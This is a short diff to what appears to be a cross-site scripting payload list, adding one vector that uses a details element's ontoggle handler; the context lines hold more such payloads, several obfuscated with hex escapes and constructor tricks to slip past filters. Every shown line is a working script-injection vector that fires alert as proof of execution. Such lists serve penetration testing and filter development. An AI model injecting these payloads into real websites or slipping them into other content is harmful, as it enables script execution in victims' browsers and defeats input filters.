@@ -76,6 +76,7 @@ content['alert'](6)
 [12].forEach(alert);
  
 <audio src onloadstart=alert(1)>
+ <details/open/ontoggle="alert`1`">
 <body onpageshow=Set.constructor`al\x65rt\x28/xss/\x29```>
 <details open ontoggle=[1].map(alert)>
  <body onpageshow=top.alert`1`>
